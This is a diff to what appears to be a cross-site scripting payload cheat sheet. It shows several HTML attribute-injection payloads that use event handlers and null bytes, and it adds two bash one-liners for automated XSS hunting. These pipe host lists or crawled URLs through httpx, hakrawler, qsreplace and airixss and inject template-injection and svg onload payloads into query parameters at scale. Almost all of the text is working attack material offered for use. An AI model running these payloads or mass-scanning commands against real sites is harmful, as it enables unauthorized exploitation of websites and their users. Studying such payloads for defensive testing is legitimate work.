@@ -38,3 +38,12 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 "><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
 "><html><select %00 onControl onpointerenter=prompt(domain) hello>
 "><input %00 onControl hello oninput=confirm(domain) x>
+```
+
+#### XSS Auto Bash Exploitation :
+```
+cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert("
+```
+```
+echo https://example [.]com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+```
